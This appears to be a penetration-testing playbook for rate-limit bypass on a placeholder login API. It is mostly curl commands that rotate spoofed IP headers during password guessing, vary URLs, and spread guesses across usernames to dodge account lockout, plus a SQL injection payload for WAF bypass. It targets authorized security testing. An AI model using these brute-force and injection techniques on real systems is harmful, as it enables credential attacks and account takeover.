---
name: attack-rate-limit-bypass
description: "Rate limit bypass testing — XFF rotation, case variation, method switching, header manipulation"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - rate-limit
  - brute-force
  - web
  - bypass
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-307
  - CWE-770
chains_with:
  - attack-race-condition
prerequisites: []
severity_boost:
  attack-race-condition: "Rate limit bypass + race condition = unlimited exploitation"
---

# Rate Limit Bypass

## Objective

Bypass rate limiting mechanisms to enable brute-force attacks, credential stuffing, or abuse of rate-limited functionality.

## Testing Methodology

### Phase 1: Automated Bypass Testing

```bash
# Full bypass test suite (5 techniques)
attack_script rate_limit_bypass "https://TARGET/api/login" \
  --method POST \
  -H "Content-Type:application/json" \
  -d '{"email":"test@test.com","password":"test"}' \
  --count 20 \
  --json-output
```

Tests automatically:
1. X-Forwarded-For IP rotation
2. URL case variation
3. HTTP method switching
4. Random query parameter injection
5. Header-based bypasses

### Phase 2: X-Forwarded-For Rotation

```bash
# Rotate source IP via headers
for i in $(seq 1 50); do
  IP="$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1))"
  curl -s -o /dev/null -w "%{http_code} " \
    -X POST https://TARGET/api/login \
    -H "X-Forwarded-For: $IP" \
    -H "X-Real-IP: $IP" \
    -H "X-Client-IP: $IP" \
    -d '{"email":"test@test.com","password":"guess"}'
done
```

### Phase 3: URL Manipulation

```bash
# Path case variation
curl https://TARGET/API/LOGIN
curl https://TARGET/Api/Login

# Trailing slash/dot
curl https://TARGET/api/login/
curl https://TARGET/api/login/.

# Double slash
curl https://TARGET//api//login

# Random query params (new cache key)
curl "https://TARGET/api/login?_=$(date +%s)"
```

### Phase 4: Header Bypasses

```bash
curl -X POST https://TARGET/api/login \
  -H "X-Forwarded-For: 127.0.0.1"

curl -X POST https://TARGET/api/login \
  -H "X-Forwarded-Host: localhost"

curl -X POST https://TARGET/api/login \
  -H "X-Original-URL: /api/login"

curl -X POST https://TARGET/api/login \
  -H "X-Custom-IP-Authorization: 127.0.0.1"
```

### Phase 5: Account Lockout Bypass

```bash
# Distribute across usernames
for user in user1 user2 user3; do
  curl -X POST https://TARGET/api/login \
    -d "{\"email\":\"$user@test.com\",\"password\":\"common_password\"}"
done

# IP rotation + distributed usernames = bypass
```

### Phase 6: WAF Bypass + Rate Limit

```bash
# Encode payloads to avoid WAF detection
attack_script waf_bypass "admin' OR 1=1--" --test-url "https://TARGET/api/login" --param password
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Rate limit bypass on login/auth endpoint | High (P2) |
| Rate limit bypass on password reset | High (P2) |
| Rate limit bypass on OTP/2FA verification | Critical (P1) |
| Rate limit bypass on financial operations | Critical (P1) |
| Rate limit bypass on non-sensitive endpoint | Low (P4) |

## Evidence Requirements

- Endpoint tested
- Normal rate limit behavior (429 after N requests)
- Bypass technique used
- Successful requests beyond the limit
- Count of requests that bypassed the limit

## Tools

- `attack_script rate_limit_bypass` — automated 5-technique bypass testing
- `attack_script waf_bypass` — encoding variants for WAF bypass

## References

- [OWASP: Rate Limiting](https://owasp.org/www-community/controls/Rate_Limiting)
- [HackerOne: Rate Limit Bypass](https://www.hackerone.com/vulnerability-management/rate-limiting-bypass-techniques)
